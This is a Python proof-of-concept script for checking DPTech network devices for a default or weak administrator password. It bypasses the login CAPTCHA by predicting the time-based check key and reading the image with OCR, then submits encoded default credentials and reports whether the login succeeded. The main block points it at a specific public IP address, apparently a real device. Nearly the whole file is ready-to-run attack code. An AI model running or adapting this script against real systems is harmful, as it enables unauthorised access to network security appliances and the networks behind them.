from poctools import BasicPoc
from poctools.encrypt import md5
from datetime import datetime
import pytesseract
import time
from PIL import Image
from io import BytesIO


def new_ocr(image_data: bytes, charset: str) -> str:
    config = f"--psm 10 --oem 3 -c tessedit_char_whitelist={charset}"
    image = Image.open(BytesIO(image_data)).convert('L')
    threshold=150
    table=[]
    for i in range(256):
        if i<threshold:
            table.append(0)
        else:
            table.append(1)
    image = image.point(table, "1")
    return pytesseract.image_to_string(image, config=config).strip()


class DPTechWeakCipherPoc(BasicPoc):
    login_uri = "/func/web_main/login"
    verify_code_uri = "/func/web_main/validate"

    def __init__(self):
        super(DPTechWeakCipherPoc, self).__init__()
        self.name = "迪普科技弱密码"

    @staticmethod
    def check_key():
        a = datetime.now()
        s = f"{a.year - 1900}{a.month}{a.weekday()+1}{a.hour}{a.minute}{a.second}001"
        return md5(s)

    def verify(self, url: str) -> bool:
        self.set_loglevel("DEBUG")
        payload = {
            "user_name": "%89%94%90%83%86", 
            "password": "%67%91%66%86%81%82%83%104%89%94%90%83%86", 
            "language": 1,
            "password1": "",
            "otp_value": "",
            "verify": ""
        }
        while True:
            check = self.check_key()
            verify_code_response = self.get(url + self.verify_code_uri, params=dict(check=check))
            if verify_code_response is None:
                return False
            code = new_ocr(verify_code_response.content, "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ")
            if len(code) != 4:
                print("识别验证码失败")
                time.sleep(1)
                continue
            payload.setdefault("code", code)
            payload.setdefault("check", check)
            login_response = self.post(url + self.login_uri, data=payload)
            if login_response is None:
                print("not login response")
                return False
            text = login_response.text
            if "校验码验证失败" in login_response.text:
                print("校验码验证失败")
                continue
            return '在线用户达到最大上限' in text or '/func/web_main/display/frame/main' in text


if __name__ == '__main__':
    target = "https://219.157.116.100:4443"
    tp = DPTechWeakCipherPoc()
    result = tp.run(target)
    print(f"{target} -> {result}")




